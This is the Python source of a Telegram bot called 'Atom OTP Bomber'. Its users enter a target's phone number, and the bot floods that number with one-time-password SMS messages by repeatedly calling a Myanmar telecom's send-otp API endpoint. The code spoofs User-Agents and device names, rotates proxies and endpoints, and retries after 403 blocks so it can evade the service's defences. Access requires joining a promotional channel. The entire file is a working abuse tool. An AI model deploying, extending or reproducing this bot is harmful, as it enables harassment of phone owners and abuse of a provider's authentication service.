#!/usr/bin/env python3
"""
Telegram Bot - Atom OTP Bomber (Upgraded)
- Secure admin list from .env
- Logging to file
- Proxy rotation
- Multi-API rotation
- Retry for 403/5xx errors
"""

import asyncio
import os
import random
import re
import time
import logging
from datetime import datetime, timedelta
from typing import Optional, List

from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, KeyboardButton
)
from aiogram.utils.keyboard import InlineKeyboardBuilder
from dotenv import load_dotenv
import aiohttp
from aiohttp import ClientTimeout, ClientConnectorError

# ---------- 🔒 Load .env & Setup Logging ----------
load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    exit("BOT_TOKEN not set in .env")

# Admin IDs
admins_str = os.getenv("ADMIN_IDS", "")
ADMIN_IDS = [int(x.strip()) for x in admins_str.split(",") if x.strip().isdigit()]

# Proxy list
proxy_str = os.getenv("PROXY_LIST", "")
PROXY_LIST = [p.strip() for p in proxy_str.split(",") if p.strip()] if proxy_str else []

# API Endpoints (rotate)
api_str = os.getenv("API_ENDPOINTS", "")
if api_str:
    API_ENDPOINTS = [e.strip() for e in api_str.split(",") if e.strip()]
else:
    # Default Atom endpoint if not provided
    API_ENDPOINTS = ["https://store.atom.com.mm/mytmapi/v1/my/local-auth/send-otp?msisdn={msisdn}&userid=-1&v=4.14.1"]

# Channel config
CHANNEL_USERNAME = "@MytelAtom_Hub"
CHANNEL_LINK = "https://t.me/MytelAtom_Hub"

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[
        logging.FileHandler("bot.log", encoding="utf-8"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Rotating User-Agents
USER_AGENTS = [
    ("MyTM/4.11.0/Android/25", "Xiaomi 2201122C"),
    ("MyTM/4.12.1/Android/28", "Samsung Galaxy S21"),
    ("MyTM/4.10.2/Android/24", "OnePlus Nord"),
    ("MyTM/4.13.0/iPhone iOS 16.5", "iPhone 14 Pro"),
    ("MyTM/4.11.3/Android/26", "Google Pixel 6"),
    ("MyTM/4.14.0/Android/27", "Oppo Reno 8"),
]

# ---------- 🤖 Bot Setup ----------
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
router = Router()
dp.include_router(router)

active_tasks: dict[int, asyncio.Task] = {}
stop_flags: dict[int, asyncio.Event] = {}
bomb_stats: dict[int, dict] = {}

# ---------- 🎛️ Keyboards ----------
main_menu = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="💣 Start Bombing")],
        [KeyboardButton(text="📊 Status"), KeyboardButton(text="🛑 Stop")],
    ],
    resize_keyboard=True,
)

def interval_keyboard():
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="3s", callback_data="int_3s"),
        InlineKeyboardButton(text="5s", callback_data="int_5s"),
    )
    builder.row(
        InlineKeyboardButton(text="5min", callback_data="int_5min"),
        InlineKeyboardButton(text="15min", callback_data="int_15min"),
        InlineKeyboardButton(text="30min", callback_data="int_30min"),
    )
    return builder.as_markup()

def count_keyboard():
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="10", callback_data="cnt_10"),
        InlineKeyboardButton(text="20", callback_data="cnt_20"),
        InlineKeyboardButton(text="30", callback_data="cnt_30"),
        InlineKeyboardButton(text="50", callback_data="cnt_50"),
    )
    return builder.as_markup()

def join_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="📣 Join Channel", url=CHANNEL_LINK),
                InlineKeyboardButton(text="🔄 Check Again", callback_data="check_join"),
            ]
        ]
    )

# ---------- 📋 States ----------
class BombForm(StatesGroup):
    waiting_for_phone = State()
    waiting_for_interval = State()
    waiting_for_count = State()

# ---------- 🔧 Helper Functions ----------
def normalize_phone(raw: str) -> Optional[str]:
    digits = re.sub(r'\D', '', raw)
    if len(digits) == 11 and digits[0] == "0":
        return "95" + digits[1:]
    if digits.startswith("959") and len(digits) == 12:
        return digits
    if len(digits) == 10:
        return "95" + digits
    return None

def interval_to_seconds(cb_data: str) -> Optional[int]:
    mapping = {
        "int_3s": 3,
        "int_5s": 5,
        "int_5min": 5 * 60,
        "int_15min": 15 * 60,
        "int_30min": 30 * 60,
    }
    return mapping.get(cb_data)

def count_from_cb(cb_data: str) -> Optional[int]:
    mapping = {
        "cnt_10": 10,
        "cnt_20": 20,
        "cnt_30": 30,
        "cnt_50": 50,
    }
    return mapping.get(cb_data)

async def is_member(user_id: int) -> bool:
    if user_id in ADMIN_IDS:
        logger.info(f"Admin {user_id} bypassed channel check")
        return True
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status in ("member", "administrator", "creator")
    except Exception as e:
        logger.warning(f"getChatMember error for {user_id}: {e}")
        return False

async def check_membership_and_prompt(message: Message) -> bool:
    if not await is_member(message.from_user.id):
        await message.answer(
            "🚫 ဤ Bot ကိုအသုံးပြုရန် Channel သို့ အရင်ဝင်ရောက်ပါ။",
            reply_markup=join_keyboard(),
            disable_web_page_preview=True,
        )
        return False
    return True

def get_random_proxy() -> Optional[str]:
    """Return a random proxy from list or None if list empty."""
    if PROXY_LIST:
        return random.choice(PROXY_LIST)
    return None

def get_random_endpoint(phone: str) -> str:
    """Pick a random API endpoint and format with phone."""
    endpoint = random.choice(API_ENDPOINTS)
    return endpoint.format(msisdn=phone)

def random_headers():
    ua, dev = random.choice(USER_AGENTS)
    return {
        "Device-Name": dev,
        "User-Agent": ua,
        "X-Server-Select": "production",
        "Content-Type": "application/json;charset=UTF-8",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br",
    }

async def send_otp_with_retry(session: aiohttp.ClientSession, phone: str, max_retries=3) -> tuple:
    """
    Returns (success: bool, status_code: int, detail: str)
    Retries on 403, 5xx up to max_retries with 5s delay between.
    """
    for attempt in range(max_retries):
        try:
            headers = random_headers()
            proxy = get_random_proxy()
            url = get_random_endpoint(phone)
            payload = {"msisdn": phone}
            logger.debug(f"Attempt {attempt+1}: POST {url} via proxy={proxy}")

            async with session.post(
                url,
                json=payload,
                headers=headers,
                proxy=proxy,
                timeout=ClientTimeout(total=10)
            ) as resp:
                data = await resp.json()
                code = resp.status

                # Success
                if code == 200 and data.get("status") == "success":
                    logger.info(f"OTP success for {phone} via {url}")
                    return True, code, "success"

                # Rate Limit - no retry, immediate propagate
                if code == 429:
                    logger.warning(f"Rate limit on {phone}")
                    return False, 429, "Rate Limited"

                # Forbidden / Server errors -> retry
                if code == 403 or code >= 500:
                    logger.warning(f"Retryable error {code} on {phone} (attempt {attempt+1}/{max_retries})")
                    if attempt == max_retries - 1:
                        return False, code, data.get("message", "Unknown")
                    await asyncio.sleep(5)  # wait before retry
                    continue

                # Other 4xx -> do not retry
                return False, code, data.get("message", "Unknown")

        except (ClientConnectorError, asyncio.TimeoutError, Exception) as e:
            logger.error(f"Network/timeout error on attempt {attempt+1}: {e}")
            if attempt == max_retries - 1:
                return False, 0, str(e)
            await asyncio.sleep(5)

    return False, 0, "Max retries exceeded"

# ---------- 🔁 Bombing Task ----------
async def bomb_loop(
    user_id: int,
    phone: str,
    interval: int,
    total_count: int,
    status_msg: Message,
    stop_event: asyncio.Event,
):
    stats = {
        "total": total_count,
        "sent": 0,
        "success": 0,
        "fail": 0,
        "status": "Running",
        "paused_until": None,
    }
    bomb_stats[user_id] = stats
    stop_flags[user_id] = stop_event
    logger.info(f"Bomb started - user={user_id}, phone={phone}, interval={interval}s, count={total_count}")

    connector = aiohttp.TCPConnector(limit=10)  # limit simultaneous connections
    async with aiohttp.ClientSession(connector=connector) as session:
        last_update = 0
        while not stop_event.is_set() and stats["sent"] < total_count:
            # Pause handling (Rate Limit 429)
            if stats["paused_until"]:
                if datetime.now() < stats["paused_until"]:
                    remaining = (stats["paused_until"] - datetime.now()).seconds
                    if time.time() - last_update >= 10:
                        last_update = time.time()
                        text = (
                            f"🔄 Rate Limit – Paused\n"
                            f"📱 Target: `{phone}`\n"
                            f"⏱ Interval: {interval}s\n"
                            f"📊 Progress: {stats["sent"]}/{total_count}\n"
                            f"✅ Success: {stats["success"]}  ❌ Fail: {stats["fail"]}\n"
                            f"⏰ Resume in {remaining//60:02d}:{remaining%60:02d}"
                        )
                        try:
                            await status_msg.edit_text(text, parse_mode="Markdown")
                        except Exception as e:
                            logger.error(f"Error editing status message: {e}")
                    await asyncio.sleep(1) # Check every second during pause
                    continue
                else:
                    stats["paused_until"] = None # Resume

            success, code, detail = await send_otp_with_retry(session, phone)
            stats["sent"] += 1

            if success:
                stats["success"] += 1
            else:
                stats["fail"] += 1
                if code == 429: # Rate limit, pause for 1 hour
                    stats["paused_until"] = datetime.now() + timedelta(hours=1)
                    logger.warning(f"Rate limit hit for {phone}. Pausing for 1 hour.")

            if time.time() - last_update >= 5 or stats["sent"] == total_count:
                last_update = time.time()
                text = (
                    f"💣 Bombing Status\n"
                    f"📱 Target: `{phone}`\n"
                    f"⏱ Interval: {interval}s\n"
                    f"📊 Progress: {stats["sent"]}/{total_count}\n"
                    f"✅ Success: {stats["success"]}  ❌ Fail: {stats["fail"]}"
                )
                try:
                    await status_msg.edit_text(text, parse_mode="Markdown")
                except Exception as e:
                    logger.error(f"Error editing status message: {e}")

            if stats["sent"] < total_count:
                await asyncio.sleep(interval)

    stats["status"] = "Completed" if stats["sent"] >= total_count else "Stopped"
    final_text = (
        f"✅ Bombing Finished!\n"
        f"📱 Target: `{phone}`\n"
        f"📊 Total Sent: {stats["sent"]}\n"
        f"✅ Success: {stats["success"]}  ❌ Fail: {stats["fail"]}"
    )
    try:
        await status_msg.edit_text(final_text, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Error editing final status message: {e}")
    logger.info(f"Bomb finished - user={user_id}, phone={phone}")
    del bomb_stats[user_id]
    if user_id in stop_flags: del stop_flags[user_id]

# ---------- 💬 Handlers ----------
@router.message(Command("start"))
async def command_start_handler(message: Message, state: FSMContext) -> None:
    if not await check_membership_and_prompt(message):
        return
    await state.clear()
    await message.answer(
        f"Hello {message.from_user.full_name}! Welcome to Atom OTP Bomber. "
        "Please choose an option below:",
        reply_markup=main_menu,
    )

@router.callback_query(F.data == "check_join")
async def check_join_handler(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    if await check_membership_and_prompt(callback.message):
        await state.clear()
        await callback.message.answer(
            "✅ You have joined the channel! Please choose an option below:",
            reply_markup=main_menu,
        )

@router.message(F.text == "💣 Start Bombing")
async def start_bombing_handler(message: Message, state: FSMContext) -> None:
    if not await check_membership_and_prompt(message):
        return
    if message.from_user.id in active_tasks:
        await message.answer("⚠️ You already have an active bombing task. Please stop it first.")
        return
    await message.answer("📞 Please send the target phone number (e.g., 09xxxxxxxxx or 959xxxxxxxxx):")
    await state.set_state(BombForm.waiting_for_phone)

@router.message(BombForm.waiting_for_phone)
async def process_phone(message: Message, state: FSMContext) -> None:
    phone = normalize_phone(message.text)
    if not phone:
        await message.answer("❌ Invalid phone number format. Please try again.")
        return
    await state.update_data(phone=phone)
    await message.answer("⏱ Please choose bombing interval:", reply_markup=interval_keyboard())
    await state.set_state(BombForm.waiting_for_interval)

@router.callback_query(BombForm.waiting_for_interval, F.data.startswith("int_"))
async def process_interval(callback: CallbackQuery, state: FSMContext) -> None:
    await callback.answer()
    interval = interval_to_seconds(callback.data)
    if not interval:
        await callback.message.answer("❌ Invalid interval. Please try again.")
        return
    await state.update_data(interval=interval)
    await callback.message.edit_text("🔢 Please choose how many OTPs to send:", reply_markup=count_keyboard())
    await state.set_state(BombForm.waiting_for_count)

@router.callback_query(BombForm.waiting_for_count, F.data.startswith("cnt_"))
async def process_count(callback: CallbackQuery, state: FSMContext) -> None:
    await callback.answer()
    count = count_from_cb(callback.data)
    if not count:
        await callback.message.answer("❌ Invalid count. Please try again.")
        return
    user_data = await state.get_data()
    phone = user_data["phone"]
    interval = user_data["interval"]
    await state.clear()

    status_msg = await callback.message.edit_text(
        f"🚀 Starting bombing for `{phone}` with {count} OTPs every {interval}s...",
        parse_mode="Markdown"
    )

    stop_event = asyncio.Event()
    task = asyncio.create_task(
        bomb_loop(callback.from_user.id, phone, interval, count, status_msg, stop_event)
    )
    active_tasks[callback.from_user.id] = task

@router.message(F.text == "📊 Status")
async def show_status_handler(message: Message) -> None:
    if not await check_membership_and_prompt(message):
        return
    user_id = message.from_user.id
    if user_id in bomb_stats:
        stats = bomb_stats[user_id]
        text = (
            f"💣 Current Bombing Status\n"
            f"📱 Target: `{stats["phone"]}`\n"
            f"⏱ Interval: {stats["interval"]}s\n"
            f"📊 Progress: {stats["sent"]}/{stats["total"]}\n"
            f"✅ Success: {stats["success"]}  ❌ Fail: {stats["fail"]}\n"
            f"Status: {stats["status"]}"
        )
        if stats["paused_until"]:
            remaining = (stats["paused_until"] - datetime.now()).seconds
            text += f"\n⏰ Paused: {remaining//60:02d}:{remaining%60:02d} remaining"
        await message.answer(text, parse_mode="Markdown")
    else:
        await message.answer("ℹ️ No active bombing task found.")

@router.message(F.text == "🛑 Stop")
async def stop_bombing_handler(message: Message) -> None:
    if not await check_membership_and_prompt(message):
        return
    user_id = message.from_user.id
    if user_id in active_tasks:
        stop_flags[user_id].set()
        active_tasks[user_id].cancel()
        del active_tasks[user_id]
        await message.answer("✅ Bombing task stopped.")
    else:
        await message.answer("ℹ️ No active bombing task to stop.")

@router.message(Command("admin"))
async def admin_command_handler(message: Message) -> None:
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("🚫 You are not authorized to use this command.")
        return
    
    admin_menu = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📝 Add Admin"), KeyboardButton(text="🗑 Remove Admin")],
            [KeyboardButton(text="➕ Add Proxy"), KeyboardButton(text="➖ Remove Proxy")],
            [KeyboardButton(text="📜 List Admins"), KeyboardButton(text="🌐 List Proxies")],
            [KeyboardButton(text="🔙 Main Menu")]
        ],
        resize_keyboard=True,
    )
    await message.answer("Admin Menu:", reply_markup=admin_menu)

@router.message(F.text == "🔙 Main Menu")
async def back_to_main_menu(message: Message, state: FSMContext) -> None:
    await state.clear()
    await message.answer("Returning to main menu:", reply_markup=main_menu)

# Placeholder for admin functions (to be implemented)
@router.message(F.text == "📝 Add Admin")
async def add_admin_placeholder(message: Message):
    await message.answer("This feature is not yet implemented.")

@router.message(F.text == "🗑 Remove Admin")
async def remove_admin_placeholder(message: Message):
    await message.answer("This feature is not yet implemented.")

@router.message(F.text == "➕ Add Proxy")
async def add_proxy_placeholder(message: Message):
    await message.answer("This feature is not yet implemented.")

@router.message(F.text == "➖ Remove Proxy")
async def remove_proxy_placeholder(message: Message):
    await message.answer("This feature is not yet implemented.")

@router.message(F.text == "📜 List Admins")
async def list_admins_placeholder(message: Message):
    await message.answer("This feature is not yet implemented.")

@router.message(F.text == "🌐 List Proxies")
async def list_proxies_placeholder(message: Message):
    await message.answer("This feature is not yet implemented.")

async def main() -> None:
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.info("Starting bot")
    asyncio.run(main())
